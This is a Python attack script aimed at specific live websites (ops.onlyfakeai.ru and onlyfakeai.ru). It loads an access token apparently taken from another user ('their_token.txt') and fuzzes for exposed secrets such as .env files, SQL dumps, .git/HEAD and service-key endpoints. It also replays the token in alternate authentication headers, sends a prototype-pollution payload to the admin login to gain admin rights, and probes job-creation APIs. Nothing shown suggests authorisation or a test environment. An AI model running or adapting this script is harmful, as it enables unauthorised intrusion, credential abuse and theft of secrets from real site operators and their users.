import ssl, json, urllib.request, urllib.error

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
tok = json.loads(open("their_token.txt", encoding="utf-8").read())["access_token"]

def req(method, url, body=None, token=None, extra=None):
    h = {"User-Agent": "Mozilla/5.0"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if extra:
        h.update(extra)
    data = None
    if body is not None:
        h["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()

print("=== 2. ops static file fuzz ===")
ops_files = [
    "/profiles-admin.js", "/profiles-admin", "/auth.js", "/supabase.js",
    "/config.js", "/config.json", "/settings.js", "/db.js", "/database.js",
    "/routes.js", "/src/index.js", "/src/server.js", "/src/app.js",
    "/dist/", "/middleware.js", "/auth-middleware.js", "/admin.js",
    "/backup.sql", "/dump.sql", "/db.sql", "/db.json", "/data.json",
    "/backup.zip", "/ops.zip", "/archive.tar.gz", "/backup.tar.gz",
    "/logs/", "/log.txt", "/error.log", "/access.log",
    "/.env", "/.env.local", "/.env.production", "/.git/HEAD",
    "/vercel.json", "/next.config.js", "/package-lock.json",
    "/yarn.lock", "/Dockerfile", "/docker-compose.yml",
    "/api/profiles-admin", "/api/config", "/api/supabase-config",
    "/api/env", "/api/keys", "/api/service-key",
]
for f in ops_files:
    st, hd, raw = req("GET", "https://ops.onlyfakeai.ru" + f)
    if st == 200:
        print(f, "-> 200 <<<<<<<<<<<<", raw[:150].decode("utf-8", "ignore")[:120])
    elif st not in (404, 401, 405):
        print(f, "->", st, raw[:100].decode("utf-8", "ignore")[:90])

print("\n=== 3. ops verify alternate auth placements ===")
for hname, hval in [
    ("X-Admin-Token", tok), ("x-access-token", tok), ("token", tok),
    ("Authorization", "Token " + tok), ("Cookie", "adminToken=" + tok),
]:
    st, hd, raw = req("GET", "https://ops.onlyfakeai.ru/api/auth/verify",
                      extra={hname: hval})
    print(hname, "->", st, raw[:120].decode("utf-8", "ignore")[:110])
st, hd, raw = req("GET", "https://ops.onlyfakeai.ru/api/auth/verify?token=" + tok)
print("?token= ->", st, raw[:160].decode("utf-8", "ignore")[:150])

print("\n=== 4. prototype pollution on ops login ===")
pp = {"email": "x@x.com", "password": "x", "__proto__": {"admin": True},
      "constructor": {"prototype": {"admin": True}}}
st, hd, raw = req("POST", "https://ops.onlyfakeai.ru/api/auth/login", body=pp)
print("pollution probe ->", st, raw[:200].decode("utf-8", "ignore")[:180])

print("\n=== 5. main site job creation endpoint discovery ===")
for m, p in [
    ("POST", "https://onlyfakeai.ru/api/generate"),
    ("POST", "https://onlyfakeai.ru/api/upload"),
    ("POST", "https://onlyfakeai.ru/api/create-job"),
    ("POST", "https://onlyfakeai.ru/api/generate-document"),
    ("POST", "https://onlyfakeai.ru/api/jobs"),
]:
    st, hd, raw = req(m, p, body={"test": 1}, token=tok)
    print(m, p, "->", st, raw[:120].decode("utf-8", "ignore")[:100])
